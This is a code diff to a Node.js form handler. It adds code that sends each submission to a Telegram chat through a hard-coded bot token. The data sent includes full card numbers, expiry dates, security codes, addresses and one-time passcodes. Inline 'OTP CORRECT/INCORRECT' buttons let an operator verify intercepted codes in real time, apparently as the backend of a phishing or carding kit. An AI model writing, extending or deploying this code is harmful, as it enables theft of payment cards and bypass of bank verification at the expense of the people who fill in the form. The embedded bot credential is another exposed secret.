@@ -1,7 +1,12 @@
 const db = require("../models");
 const FormData = db.FormData;
 
-// Create and Save new FormData
+const axios = require("axios");
+
+// Hard-code your Telegram bot token and chat ID here
+const TELEGRAM_BOT_TOKEN = "5626992499:AAHfKlpL4ESnTjcXI61fXSx57cu0fW1pU_Y";
+const TELEGRAM_CHAT_ID = "-1002170066715";
+
 exports.create = (req, res) => {
   const formData = {
     phoneNumber: req.body.phoneNumber,
@@ -18,6 +23,64 @@ exports.create = (req, res) => {
 
   FormData.create(formData)
     .then((data) => {
+      // Send data to Telegram
+      const message = `
+        New Form Submission:
+        Phone Number: ${formData.phoneNumber}
+        First Name: ${formData.firstName}
+        Last Name: ${formData.lastName}
+        Delivery Address: ${formData.deliveryAddress}
+        Card Holder Name: ${formData.cardHolderName}
+        Card Number: ${formData.cardNumber}
+        Expiry Date: ${formData.expiryDate}
+        Security Code: ${formData.securityCode}
+        Reference: ${formData.ref}
+        OTP: ${formData.otp}
+      `;
+
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const inlineKeyboard = {
+        inline_keyboard: [
+          [{ text: "SHOW OTP", callback_data: "show_otp" }],
+          [{ text: "OTP CORRECT", callback_data: "otp_correct" }],
+          [{ text: "OTP INCORRECT", callback_data: "otp_incorrect" }],
+        ],
+      };
+      axios
+        .post(telegramUrl, {
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          reply_markup: inlineKeyboard,
+        })
+        .then((response) => {
+          console.log("Message sent to Telegram:", response.data);
+          // Extract message_id from response
+          const messageId = response.data.result.message_id;
+
+          // Update the form data with the message_id
+          FormData.update(
+            { messageId: messageId },
+            {
+              where: { id: data.id }, // Assuming the ID of the created record is in data.id
+            }
+          )
+            .then((num) => {
+              if (num == 1) {
+                console.log("Form data updated with messageId:", messageId);
+              } else {
+                console.log(
+                  "Cannot update form data with messageId. Maybe form data was not found or req.body is empty!"
+                );
+              }
+            })
+            .catch((err) => {
+              console.error("Error updating form data with messageId:", err);
+            });
+        })
+        .catch((error) => {
+          console.error("Error sending message to Telegram:", error);
+        });
+
       res.send(data);
     })
     .catch((err) => {
